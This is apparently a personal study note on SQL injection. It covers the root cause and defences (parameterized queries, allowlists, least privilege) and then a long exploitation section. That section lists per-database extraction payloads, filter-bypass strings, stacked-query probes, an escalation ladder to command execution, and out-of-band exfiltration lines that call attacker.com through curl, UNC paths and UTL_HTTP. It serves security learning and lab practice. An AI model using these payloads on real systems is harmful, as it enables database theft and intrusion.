# SQL Injection
Tags: #vulnerability #injection #database #day1 #day4

## Understand the Feature First

The developer concatenates user input into a SQL string. The database parser receives one string and can't tell which parts are structure and which are data. The attacker provides input containing SQL syntax; the parser interprets it as code instead of data.

> **Forever-hook:** "SQLi is a parsing confusion problem. Code and data share the same channel. The parser can't tell them apart because they were mixed before it ever saw them."

## Why It Exists (Root Cause)

String concatenation mixes SQL structure and user data into one string. The database parser has no way to distinguish them.

**Why sanitization always fails:** you're writing your own SQL parser to defeat the real SQL parser. The attacker only needs one gap. Nested keywords (`UNUNIONION`), charset tricks (GBK `0xbf27` — CVE-2006-2753), MySQL version comments (`/*!50000UNION*/`) all defeat blocklists.

## The Data Flow

```
Source:  request.args.get('q') returns "' UNION SELECT password FROM users--"
    ↓
Sink:    cursor.execute(f"...WHERE name LIKE '%{q}%'")
    ↓
DB gets: SELECT ... LIKE '%' UNION SELECT password FROM users--%'
    ↓
Parser:  two statements — original query UNION attacker's query. Comment eats the trailing quote.
```

## What the Developer Should Have Done

**Parameterized queries** — separate code and data at the protocol level:

```
── PREPARE ──
App → DB:  "SELECT name FROM products WHERE name LIKE ?"   (structure only)
DB → App:  OK (statement_id=1)

── EXECUTE ──
App → DB:  statement_id=1, param1="shoes"                  (data only, binary, never parsed as SQL)
```

The parser is done before user data arrives. Even `' UNION SELECT...` is treated as a literal string.

```python
# The only correct pattern — parameterized binding
cursor.execute("SELECT name FROM products WHERE name LIKE %s", ('%' + q + '%',))

# DANGEROUS — looks similar but is string formatting (vulnerable)
cursor.execute("SELECT name FROM products WHERE name LIKE '%s'" % q)
# The comma-separated tuple is the difference between safe and dead.
```

**Where parameterization can't reach — allowlist:**

```python
ALLOWED_SORT = {'name', 'price', 'created_at'}
sort = request.args.get('sort', 'name')
if sort not in ALLOWED_SORT: sort = 'name'  # ignore everything except known-good
```

Table names, column names, ORDER BY directions, operators — you can't parameterize SQL structure. Allowlist the exact values you expect. Everything else becomes the default.

**PoLP on the database role** — parameterization stops the bug from existing. [[Principle of Least Privilege]] stops it from escalating. The app user should never be superuser. See [[Database as a Process]] for what the surplus unlocks.

## Exploitation

### Flavors = Output Bandwidth

> **Forever-hook:** "SQLi flavors aren't different bugs. They're the same bug seen through different output channels. Loud → in-band. Whisper → blind. Silent → time-based. No signal at all → OOB."

| Flavor | Channel | Bits/request | When |
|---|---|---|---|
| **UNION / in-band** | Rows rendered on page | Many | Page shows query results |
| **Error-based** | DB error in response | Many | App leaks errors (dev mode, lazy catch) |
| **Boolean-blind** | Page differs (200/404, content) | 1 bit | Login forms, exists-checks |
| **Time-based blind** | Response timing | 1 bit | Identical output — only timing leaks |
| **Out-of-band** | DNS/HTTP to your server | Many | DB has outbound network access |

Same concatenation bug. Different controller behavior. The flavor is determined by how loud the page is, not how the bug got there.

### Decision Tree

```
See query results on page?  → UNION-based
DB errors displayed?        → Error-based
Page differs on true/false? → Boolean-blind
Timing differs?             → Time-based blind
DB can make outbound calls? → Out-of-band
```

### Error-Based — Per-Dialect Tricks

Pick a function that converts/parses a string, feed it something that won't parse — the error contains your data.

| Database | Trick | Error contains |
|---|---|---|
| **PostgreSQL** | `CAST((SELECT secret) AS int)` | "invalid input syntax for integer: \<secret\>" |
| **PostgreSQL** | `QUERY_TO_XML('SELECT * FROM users',true,true,'')::text::int` | Whole table as XML in one error |
| **MySQL ≤5.7** | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret)))` | XPath error with secret |
| **MySQL 8+** | `JSON_KEYS((SELECT CONCAT('{"',secret,'":1}')))` | JSON parse error |
| **MSSQL** | `CONVERT(int, (SELECT secret))` | Conversion error |
| **Oracle** | `UTL_INADDR.GET_HOST_NAME((SELECT secret FROM dual))` | Hostname lookup error |

If errors aren't visible, check for a debug gate you can flip: [[Client-Controlled IP Headers]] + [[Debug Mode Disclosure]].

### The Side-Channel / Precomputation Trick

> **Forever-hook:** "Don't ask the database yes/no. Look at what the page is already rendering for free. If that output has a numeric axis you can index into, encode the secret into that index. One request → one full byte."

Standard blind bisection takes ~7 requests per character. The precomputation trick gets a full character in one request:

```sql
-- Page renders whatever user matches the WHERE id = ...
-- Instead of asking "is char > 'm'?", just make the ID equal the secret:
SELECT * FROM users
WHERE id = (SELECT ASCII(SUBSTRING(password, 1, 1))
            FROM users WHERE username = 'admin')
```

Page renders user #36 → ASCII 36 = `$` → first char of a BCrypt hash. One request. Full byte.

**The spy/hotel analogy:** Your contact runs a hotel. Instead of calling 7 times bisecting ("is the secret > 50?"), say "send room service to the room whose number equals the secret." Your accomplice sees which room got service. The room number IS the message.

Any output with >2 possible values and a number you control is a multi-bit channel: rendered user IDs, avatar URLs, result counts, status codes, redirect targets.

### Bandwidth Optimization — Aggregation

> **Forever-hook:** "Don't extract one row at a time. Use the dialect's aggregation function and turn N requests into 1."

| Database | Function |
|---|---|
| PostgreSQL | `STRING_AGG(col, ',')` |
| MySQL/SQLite | `GROUP_CONCAT(col SEPARATOR ',')` |
| MSSQL 2017+ | `STRING_AGG(col, ',')` |
| MSSQL older | `FOR XML PATH('')` |
| Oracle | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)` |

**Whole-table dump:** PostgreSQL `QUERY_TO_XML(...)`, MSSQL `FOR JSON AUTO` — one error/response = entire table.

### Out-of-Band (OOB) — The Page Is Completely Silent

> **Forever-hook:** "When the page gives you zero signal, make the database courier the data home for you. DNS is the channel that always works because everything needs DNS."

OOB uses two channels: HTTP delivers the payload (fire-and-forget), DNS/HTTP from the DB to your listener carries the data back.

```
Attacker ──HTTP──► App ──SQL──► DB ──DNS──► Attacker's listener
   (payload)                        (data arrives here, encoded in hostname)
```

**Why DNS:** Even locked-down environments allow DNS — without it, nothing works (updates, replication, cert validation). The leak happens at the resolution step. Even if the firewall drops outbound TCP, the DNS query already reached your nameserver.

**Encoding:** Concatenate the secret into the hostname. DNS labels allow alphanumeric + dashes, max 63 chars. Hex-encode the secret. Add a per-request nonce to defeat DNS caching.

**Per-DB OOB primitives:**

| Database | Primitive | Channel |
|---|---|---|
| MySQL (Windows) | `LOAD_FILE('\\\\<data>.attacker.com\\x')` | DNS via UNC |
| PostgreSQL | `COPY ... TO PROGRAM 'curl http://<data>.attacker.com'` | HTTP (superuser) |
| PostgreSQL | `dblink('host=<data>.attacker.com ...')` | DNS via libpq |
| MSSQL | `xp_dirtree '\\\\<data>.attacker.com\\x'` | DNS+SMB |
| Oracle | `UTL_HTTP.REQUEST('http://<data>.attacker.com')` | HTTP |
| Oracle | `UTL_INADDR.GET_HOST_NAME('<data>.attacker.com')` | DNS only |

**Receivers:** Burp Collaborator (Burp Pro built-in) or `interactsh` (free, ProjectDiscovery). They give you a subdomain + wildcard NS + live callback display. No DNS expertise needed.

**When OOB fails:** egress firewall on DB host, cloud DBs in private subnets, missing privileges (`FILE`/superuser), DNS caching without nonce. Fall back to time-based.

### Filter Bypass — Picking the Locks

> **Forever-hook:** "A filter is not a wall. It's a list of specific things the developer thought to block. Enumerate what they checked, then build something they didn't list."

#### Shape Bypass (Email/URL/Phone Regex)

When a regex validates "shape" then concatenates the "validated" string into SQL, find the dead zone:

```
Developer regex: ^.*@[A-Za-z]*\.[A-Za-z]*$
Payload: ' or 1=1--@bluebird.htb

Regex sees:  "anything"(@letters.letters) → valid email ✓
SQL sees:    ' breaks literal, or 1=1 injects, -- comments out @bluebird.htb ✓
```

> **Forever-hook:** "Each shape has dead zones the parser doesn't care about. Email regexes ignore everything before @. SQL comments ignore everything after --. The zones don't overlap."

| Shape | Dead zone | Smuggle |
|---|---|---|
| Email | Before `@` | `' or 1=1--@x.com` |
| URL | Path/query/fragment | `https://x.com/?'or+1=1--` |
| "Alphanumeric" | Hex literals | `0x61646D696E` = `'admin'` (MySQL) |

#### `matches()` vs `find()` — The Java Free Lunch

```java
Pattern.compile("'|''").matcher(input).matches()  // checks WHOLE string — "a'--" slips through
Pattern.compile("'|''").matcher(input).find()      // checks ANY PART — catches it
```

> **Forever-hook:** "matches() checks the whole string. find() checks any part. Developers confuse these constantly, and it's a free lunch every time."

Grep: `grep -rnE 'matcher\(.*\)\.matches\(' --include="*.java" .`

#### Space Bypass

> **`/**/` is the universal SQL space replacement.** Comments tokenize as whitespace in SQL.

`'/**/OR/**/1=1--` — filter sees no spaces, DB parses normally.

#### Quote Bypass — Per-DB String Alternatives

| Database | No-quote string |
|---|---|
| PostgreSQL | `$$admin$$` or `$tag$admin$tag$` (dollar-quoted) |
| MySQL | `0x61646D696E` (hex) or `CHAR(97,100,109,105,110)` |
| MSSQL | `CHAR(97)+CHAR(100)+...` |
| Oracle | `q'[admin]'` or `CHR(97)\|\|CHR(100)\|\|...` |

### Stacked Queries

`;` ends the original query, starts a new one. Massive power upgrade — INSERT/UPDATE/DELETE/RCE.

| Stack | Stacked by default? |
|---|---|
| PostgreSQL + psycopg2 | **Yes** |
| MySQL + JDBC | **No** (need `allowMultiQueries=true`) |
| MSSQL + most drivers | **Yes** |
| Oracle | **No** |

Always probe early: `'; SELECT 1--`. If it works, the engagement gets much easier.

### Second-Order SQLi

Injection and execution happen in **different code paths at different times**. Attacker registers as `admin'--`. Password change later builds: `UPDATE users SET password = 'x' WHERE username = 'admin'--'` → updates admin's password.

> The dangerous assumption: "data from our own database is safe." If a user put it there, it's still user input.

Nearly invisible to automated scanners. Extremely hard to find in black-box testing.

### From SQLi to RCE — The Escalation Ladder

> **Forever-hook:** "SQLi is rarely the prize — it's the front door. The full chain is confirm → data → file read → file write → command exec → shell. Each level is a feature the vendor designed in deliberately."

```
LEVEL 0  ─ Confirm bug                  (' breaks query)
LEVEL 1  ─ Read data                    (UNION/error/blind)
LEVEL 2  ─ Read OS files                (COPY FROM / LOAD_FILE)
LEVEL 3  ─ Write OS files               (COPY TO / INTO OUTFILE / large objects)
LEVEL 4  ─ Execute commands             (COPY FROM PROGRAM / xp_cmdshell / C extension)
LEVEL 5  ─ Interactive shell            (reverse shell → privesc)
```

**Gating check:** `SELECT current_user, current_setting('is_superuser');` — if yes, levels 2-5 are 60 seconds of typing.

Full chain narrative: [[SQLi to RCE on PostgreSQL]]. Per-DB primitives: [[Database as a Process]]. Defensive layers: [[Principle of Least Privilege]].

## What the Vulnerable Code Looks Like

```java
// The tell: + operator gluing user input into SQL
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
jdbcTemplate.query(sql, ...);

// ORM escape hatches — looks safe, isn't
User.objects.raw(f"SELECT * FROM users WHERE email = '{user_input}'")
session.execute(text(f"SELECT * FROM users WHERE email = '{user_input}'"))

// Dynamic structural elements — can't parameterize, need allowlisting
sql = f"SELECT * FROM products ORDER BY {sort} {direction}"

// Python footgun: format vs bind
cursor.execute("... %s" % var)     # STRING FORMAT — vulnerable
cursor.execute("... %s", (var,))   # PARAMETERIZED  — safe (the tuple is the difference)
```

## Chains With

- [[Client-Controlled IP Headers]] — spoof `X-Forwarded-For: 127.0.0.1` to flip a debug gate, upgrading blind → error-based
- [[Debug Mode Disclosure]] — debug catch blocks turn DB errors into your output channel
- [[SQLi to RCE on PostgreSQL]] — the full five-level escalation from quote to shell
- [[Database as a Process]] — why every SQLi against a superuser connection becomes RCE
- [[Principle of Least Privilege]] — the only thing that contains the chain at every level
- [[XSS]] / [[Command Injection]] / [[SSRF]] — SQLi chains into stored payloads, OS commands via DB, outbound connections

## Key Q&A From This Session

**Q: How does ORDER BY injection leak data?**
A: Inject a `CASE` expression: `ORDER BY (CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN price ELSE name END)`. Observe sort order — price order = true, name order = false. The sort order is a 1-bit leak channel.

**Q: What's the difference between aggregation and the precomputation trick?**
A: Precomputation widens the **vertical** — full byte per request instead of 1 bit. Aggregation widens the **horizontal** — all rows in one string instead of one row per request. Combine them for maximum bandwidth.

**Q: When do stacked queries work?**
A: Driver-dependent. PostgreSQL+psycopg2 = on. MySQL+JDBC = off by default. MSSQL = on. Always probe early with `'; SELECT 1--`.

## Key Insights

- **SQLi flavors are output bandwidth, not different bugs.** Same root cause, different controller behavior. Knowing this lets you reason about *why* an endpoint forces a given technique.
- **A filter is not a wall — it's a list.** Every bypass has the same shape: enumerate what they checked, build something they didn't list. Transfers to WAFs, AV, sandboxes.
- **Shape filters have dead zones.** Email regexes ignore before `@`. SQL comments ignore after `--`. The zones don't overlap → payload fits in both.
- **`matches()` vs `find()` is the most common Java filter bug.** Grep every Java codebase for it.
- **Side-channel thinking turns slow blind into fast leaks.** Any output with >2 values and a controllable index = multi-bit channel.
- **`information_schema` is the universal DB map.** `tables` + `columns` = full schema recon. Oracle uses `ALL_TABLES`/`ALL_TAB_COLUMNS`, SQLite uses `sqlite_master`.
- **OOB is fastest when the network allows it.** Time-based = 1 bit + jitter. OOB = full field + zero jitter. Fails when DB can't reach internet.
- **SQLi is the front door, not the prize.** The escalation ladder (data → files → commands → shell) uses features the vendor designed in. Stopping at "I leaked the user table" is the junior reflex.
- **The escalation is gated on `is_superuser`.** Default installs run as superuser. The fix isn't another sanitizer — it's PoLP on the DB role.
- **Real-world breaches use this chain.** Sony, Heartland, TalkTalk, MOVEit, Ivanti — same five levels in different colors.

## Questions That Came Up

- What does SQLi look like at the network level in Burp/Wireshark?
- Deeper exploration of second-order SQLi detection in large codebases
- What does it take to write a real PostgreSQL C extension payload?
- How do modern hardened MySQL builds block UDF loading?

## Lab Work

- PortSwigger Web Security Academy — all SQLi labs
- HackTheBox — CWEE SQL injection module
- HTB BlueBird — live SQLi loop + filter bypass + escalation chain

## Links

- [[Database Queries]] — how apps talk to databases
- [[Auditing SQL Injection]] — systematic testing methodology
- [[SQLi to RCE on PostgreSQL]] — full escalation chain narrative
- [[Database as a Process]] — why SQLi against superuser = RCE
- [[Principle of Least Privilege]] — defensive discipline that contains the chain
- [[PostgreSQL Query Logs]] — live-observation tool for the static+live audit loop
- [[Client-Controlled IP Headers]] — header spoofing to flip debug gates
- [[Debug Mode Disclosure]] — debug error paths as output channels

## My Notes
